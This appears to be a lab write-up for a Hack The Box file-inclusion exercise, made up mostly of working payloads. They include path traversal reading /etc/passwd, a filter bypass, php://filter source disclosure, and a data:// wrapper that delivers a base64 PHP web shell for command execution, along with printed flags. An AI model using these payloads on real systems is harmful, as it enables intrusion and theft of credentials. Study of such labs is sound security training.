
## File Inclusion:
- For the first information, use the following payload:

    ```bash
    ../../../../etc/passwd
    ```

- This will reveal **ballen** as a username.

- The first flag is located at:

    ```bash
    ../../../../usr/share/flags/flag.txt
    ```

## Basic Bypass:
- Use the following payload for a basic bypass:

    ```bash
    ....//....//....//....//flag.txt
    ```

## PHP Filter:
1. Run **feroxbuster** to find files on the server:

    ```bash
    feroxbuster -u http://83.136.254.158:57904 -w /root/SecLists/Discovery/Web-Content/common.txt -x .php
    ```

2. You will find a file named `configure.php`. Access it with a PHP filter payload:

    ```bash
    http://83.136.254.158:57904/index.php?language=php://filter/read=convert.base64-encode/resource=configure
    ```

3. This will return a Base64-encoded file. After decoding it, you'll see:

    ```php
    <?php
    if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
        header('HTTP/1.0 403 Forbidden', TRUE, 403);
        die(header('location: /index.php'));
    }
    $config = array(
        'DB_HOST' => 'db.inlanefreight.local',
        'DB_USERNAME' => 'root',
        'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
        'DB_DATABASE' => ...
    );
    ```

## PHP Wrappers:
1. Use **curl** to access sensitive files using PHP wrappers:

    ```bash
    curl http://94.237.57.90:46790/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
    ```

2. To list files on the machine, use the following command:

    ```bash
    http://94.237.54.201:36693/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%20/
    ```

3. After locating the `.txt` file, use `cat` to read its contents:

    ```bash
    http://94.237.54.201:36693/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt
    ```

